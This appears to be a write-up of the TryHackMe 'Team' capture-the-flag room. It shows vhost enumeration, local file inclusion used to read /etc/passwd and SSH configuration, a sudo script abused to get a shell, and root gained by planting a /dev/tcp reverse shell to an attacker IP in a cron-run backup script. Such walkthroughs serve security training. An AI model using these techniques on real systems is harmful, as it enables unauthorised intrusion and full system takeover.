# Team tryhackme writeup

21 - ftp

22 - ssh

80 - http

As follwing the hint enum for vhost "dev"

add team.thm to hosts file and run gobuster

	gobuster vhost -u team.thm -w /opt/Seclists/Discovery/DNS/subdomains-top1million-5000.txt

Found dev.team.thm

http://dev.team.thm/script.php?page=/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```

lets do fuzz

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/Team]
└─$ ffuf -u http://dev.team.thm/script.php?page=FUZZ -w /opt/Seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.team.thm/script.php?page=FUZZ
 :: Wordlist         : FUZZ: /opt/Seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1
________________________________________________

/etc/hosts.deny         [Status: 200, Size: 712, Words: 128, Lines: 19]
/etc/hosts.allow        [Status: 200, Size: 412, Words: 82, Lines: 12]
/etc/hosts              [Status: 200, Size: 185, Words: 19, Lines: 9]
/etc/crontab            [Status: 200, Size: 721, Words: 103, Lines: 16]
/etc/fstab              [Status: 200, Size: 424, Words: 62, Lines: 11]
/etc/issue              [Status: 200, Size: 25, Words: 5, Lines: 4]
/etc/apache2/apache2.conf [Status: 200, Size: 7313, Words: 944, Lines: 231]
/etc/passwd             [Status: 200, Size: 1698, Words: 10, Lines: 35]
/etc/lsb-release        [Status: 200, Size: 104, Words: 3, Lines: 6]
/etc/profile            [Status: 200, Size: 582, Words: 145, Lines: 29]
/etc/resolv.conf        [Status: 200, Size: 736, Words: 97, Lines: 20]
/etc/passwd             [Status: 200, Size: 1698, Words: 10, Lines: 35]
/etc/networks           [Status: 200, Size: 92, Words: 11, Lines: 4]
/etc/network/interfaces [Status: 200, Size: 91, Words: 13, Lines: 6]
/etc/mtab               [Status: 200, Size: 2455, Words: 166, Lines: 35]
/etc/ssh/sshd_config    [Status: 200, Size: 5990, Words: 303, Lines: 170]
/etc/ssh/ssh_config     [Status: 200, Size: 1581, Words: 248, Lines: 53]
/proc/stat              [Status: 200, Size: 2149, Words: 991, Lines: 11]
/proc/modules           [Status: 200, Size: 4650, Words: 411, Lines: 84]
/proc/mounts            [Status: 200, Size: 2455, Words: 166, Lines: 35]
/proc/meminfo           [Status: 200, Size: 1308, Words: 465, Lines: 49]
/proc/ioports           [Status: 200, Size: 1007, Words: 193, Lines: 43]
/proc/interrupts        [Status: 200, Size: 1774, Words: 693, Lines: 42]
/proc/cpuinfo           [Status: 200, Size: 901, Words: 114, Lines: 29]
/etc/vsftpd.conf        [Status: 200, Size: 5937, Words: 806, Lines: 161]
/proc/self/net/arp      [Status: 200, Size: 157, Words: 79, Lines: 4]
/proc/swaps             [Status: 200, Size: 102, Words: 32, Lines: 4]
/proc/version           [Status: 200, Size: 147, Words: 17, Lines: 3]
/var/log/lastlog        [Status: 200, Size: 292867, Words: 4, Lines: 6]
/var/log/dpkg.log       [Status: 200, Size: 364050, Words: 26592, Lines: 5333]
:: Progress: [257/257] :: Job [1/1] :: 93 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
                                                                                          
```

http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

got dale ssh key

user!!

#### dale to gyles

```bash
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks

```

this /home/gyles/admin_checks script ask us to type date cmd and is execute date

Exploit 

just type /bin/bash insted of date

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: a
Enter 'date' to timestamp the file: /bin/bash
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Privesc

```bash
gyles@TEAM:/opt/admin_stuff$ cat script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site

```

script.sh backups some files, the backup scripts are runs as root. We(admin groups) have writeable permission to both backup scripts.

Exploit

put rerverse shell into /usr/local/bin/main_backup.sh

```bash
gyles@TEAM:/opt/admin_stuff$ cat /usr/local/bin/main_backup.sh
#!/bin/bash

sudo bash -c 'bash -i >& /dev/tcp/10.9.172.114/4242 0>&1'

```

now run the script.sh

Check ur NC!

```bash
┌──(arundhanush㉿kali)-[~]
└─$ nc -lnvp 4242                                                                                                                                               130 ⨯
Listening on 0.0.0.0 4242
Connection received on 10.10.11.218 39390
bash: cannot set terminal process group (2283): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# id
id
uid=0(root) gid=0(root) groups=0(root),1004(admin)

```

roooted!